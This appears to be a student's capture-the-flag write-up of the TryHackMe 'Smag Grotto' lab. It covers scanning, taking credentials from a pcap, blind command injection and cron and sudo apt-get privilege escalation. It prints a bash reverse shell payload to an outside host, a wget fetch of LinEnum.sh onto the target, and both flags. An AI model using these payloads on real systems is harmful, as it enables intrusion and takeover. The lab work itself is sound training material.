--> started off with an nmap

nmap -sC -sV grotto.thm                                              1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-06 13:03 GMT
Nmap scan report for grotto.thm (10.10.69.36)
Host is up (0.041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds


--> visitting the website showed a simple website which said "welcome to smag! this site is heavily under development, check back soon to see some of the awesome servies we offer"
--> continuing to look at the sourec code: nothing found

--> proceeded to do a dirb attack:
dirb http://10.10.69.36 -w /usr/share/wordlists/dirb/common.txt      1 ⚙

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Jan  6 13:07:14 2022
URL_BASE: http://10.10.69.36/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://10.10.69.36/ ----
                                                                             + http://10.10.69.36/index.php (CODE:200|SIZE:402)
                                                                             ==> DIRECTORY: http://10.10.69.36/mail/
+ http://10.10.69.36/server-status (CODE:403|SIZE:276)

---- Entering directory: http://10.10.69.36/mail/ ----
                                                                             + http://10.10.69.36/mail/index.php (CODE:200|SIZE:2386)

-----------------
END_TIME: Thu Jan  6 13:13:39 2022
DOWNLOADED: 9224 - FOUND: 3
--> the /mail directory led to a page which seems like it allows for downloading network traffic
--> user 'Uzi' seems to have downloaded alot of content
--> an anomaly in the attached pcap file?

--> found users:
		--> netadmin
        --> uzi
        --> jake

--> when checking the wireshark file I found a /login.php that seemed interesting
--> 1st I tried to go to 10.10.69.36/login.php but that gave a 404 not found.
--> 2nd I looked into the packet and found a username and password:
"username" = "helpdesk"
"password" = "cH4nG3M3_n0w"
--> this shows to me that it most likely has not been changed so now I just need to find where its for
--> it says the port is 34030 and IP 192.168.33.69
        --> after doing some wuick research it shows 34030 is unassigned
        --> maybe we should do a broader nmap search:

--> this belonged to a new subdomain: development.smag.thm so I added this to the /etc/hosts file
--> next I visited it: there was a login page! one for regular and one for admin
--> as I did not have any admin credentials as of yet I tried to login to the login.php (with the found credentials)
        --> It worked! and a page was showed which said 'Enter a command' + 'send' + 'logout' buttons

--> when submmitting the command it did not seem like anything specific happened
--> checking the source code: nothing special, but a PHPSESSID cookie

--> next I decided to run it through burp to maybe catch something: nothing happened, except there are 2 parameters: 'comman>
--> I therefore think there might be something to do with entering a payload here

--> clicking on the admin.php 'login' site I came to the same command page as when I logged in regularly, is this the PHPSES>
        -->:ITS THE SAME
--> this MUST be a vulnerability, so maybe I have admin privileges for the login page now to execute some commands?



--> after looking around at the blind end, I found that apprently this is a blind type command injection attack, so the outp>
--> one way to receive the output that I found (https://musyokaian.medium.com/smag-grotto-walkthrough-tryhackme-2246ecd41adb>
sudo tcpdump -i tun0 icmp                                            1 ⨯
[sudo] password for kali:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

--> meanwhile I enetered the command:
ping -c 1 <tun0 ip>
--> and it got a callback in the dumper:
16:04:19.314220 IP smag.thm > 10.11.59.68: ICMP echo request, id 959, seq 1, length 64
16:04:19.314238 IP 10.11.59.68 > smag.thm: ICMP echo reply, id 959, seq 1, length 64

--> next step = reverse shell!
--> pentest monkey - method::
--> 1. set up nc listener with a port:
nc -nvlp 9001
--> 2. run the submit through burp and replace the command with the reverse shell - 'bash' version:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

command=bash+-c+"bash+-i+>%26+/dev/tcp/10.11.59.68/9001+0>%261"&submit=

--> forwarded it and we got a shell!!
--> looking around, I found a 'jake' directory in the home directory and there was a user.txt file, but when trying to read >

--> after reading around abit I found that using LinEnum.sh could be a possibility, I just have never uploaded this to a rev>
--> reading up on it (https://null-byte.wonderhowto.com/how-to/use-linenum-identify-potential-privilege-escalation-vectors-0>
        1. download it using
        wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
                (in the new lineum directory)
        2. use python to serve the file to the target
        python -m SimpleHTTPServer
                (default port is 8000, but you can simply also specify it by writing the port at the end - do 1337)
        3. download it on the target machine:
        wget 10.11.59.68:8000/LinEnum.sh

www-data@smag:/home/jake$ cd /dev/shm
cd /dev/shm
www-data@smag:/dev/shm$ wget http://10.11.59.68:1339/LinEnum.sh
wget http://10.11.59.68:1339/LinEnum.sh
--2022-01-09 08:43:36--  http://10.11.59.68:1339/LinEnum.sh
Connecting to 10.11.59.68:1339... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .......... .....     100%  538K=0.0>

2022-01-09 08:43:36 (538 KB/s) - 'LinEnum.sh' saved [46631/46631]

www-data@smag:/dev/shm$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
www-data@smag:/dev/shm$ ./LinEnum.sh
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982
-->...etc...
--> the interesting part was this cronjob:
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys


	www-data@smag:/opt/.backups$ ls
ls
jake_id_rsa.pub.backup
ls -la
total 12
drwxr-xr-x 2 root root 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
-rw-rw-rw- 1 root root  563 Jun  5  2020 jake_id_rsa.pub.backup


--> way to exploit it: writing a key we have access to to the backup file an>
--> METHOD:
        --> 1. created a new key pair:
        ssh-keygen -f jake
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:
Your identification has been saved in jake
Your public key has been saved in jake.pub
The key fingerprint is:
SHA256:D+8GK2XZfp1wW0VFwR3v+RyA1iorehaPsgi2DeA0IP0 kali@kali
The key's randomart image is:
	+---[RSA 3072]----+
|              .+B|
| .          o  .+|
|o .        o o ..|
|o  .      . . ..o|
|.o  E   S+ .   oo|
|+ .    .=++ . ..+|
| =     ++=o  + +o|
|. = ..o+ooo . +  |
| . o o=. ...     |
+----[SHA256]-----+
        --> 2. copied the public ey to the backup directory from the vulnerable cron job
        www-data@smag:/opt/.backups$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCW34/w4Zx+9Sj9E9+pNEv1k4YMiVjgYaW/WCxGu0tnjhDYL4lZ2/xYtjSFcYEMuFIjgrZ2D1SZfK9EB6v/OZy9W70ip+nguZ1AWQDpR7et+vgv/SxMvAI732MrYYaG8spNnZOV12ElbErekm7VvK6Yb4I76L5JW0xnrXdD/f5dt+ZXJddc828r/3OOk0zG049ZThQpFzhk4GRKS59XY0cuTYdbSubylnm2OEv1sXsu22lQSaft1uYKuz52AAAC07PsCf02CJ86I72g7Uz7lELM9HRX9kt+bDXRl44cO/90NxWogbid9C/u2OBS1zWrBZWxub0HPxOy8CKBa/nyjGow/r5zJbi+JT6cafo80uZor+WBG1XmvKTRv9AxJw5dquT8de3GbhG56RZHPlJJcZfCn6icWZoy6oQNQeWa1GsSpDsqSLAL9sB/5znnbSvlb8+t6DmfNI+mAFkstfYEM+eTRKSpDsqSLAL9sB/5znnbSvlb8+t6DmfNI+mAFkstfYEM+eTRKU/UkNRo4lS8e/Sd/DNP/MNglzEm+NKIA8495T7JU=" > jake_id_rsa.pub.backup (some error in this so dont copy it completely - prbably an s missing)
	--> 3. save the file and do 'chmod 600 <file>' before logging in again:
        ssh -i jake jake@10.10.106.1
The authenticity of host '10.10.106.1 (10.10.106.1)' can't be established.
ECDSA key fingerprint is SHA256:MMv7NKmeLS/aEUSOLy0NbyGrLCEKErHJTp1cIvsxnpA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.106.1' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$

--> WERE IN!
--> now I can read the user.txt and get the first flag:
	jake@smag:~$ cat user.txt
iusGorV7EbmxM5AuIe2w499msaSuqU3j



NEXT = PRIVILEGE ESCALATION FOR ROOT
--> ill be honest and say that I had no idea how to go from here to escalate my privileges
--> so I read arounf and found:
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
--> we can run apt-get as sudo
--> looked it up in GTFOBins, and theres a possibility for a shell:
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

--> so I ran this command as jake:
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
root
--> I now have root access and realised I could find the root flag
--> I started looking around:
# cd ..
# ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
# cd root
# ls
root.txt
# cat root.txt
--> and found the flag:
uJr6zRgetaniyHVRqqL58uRasybBKz2T

This was actually quite enjoyable, and I feel like I am starting to get the hang of ssh keys - slowly but s>
The most fun  part was that I learned how to upload linenum and files simiar to it to a reverse shell, as I>
but now know to use a simple httpserver of sort:))
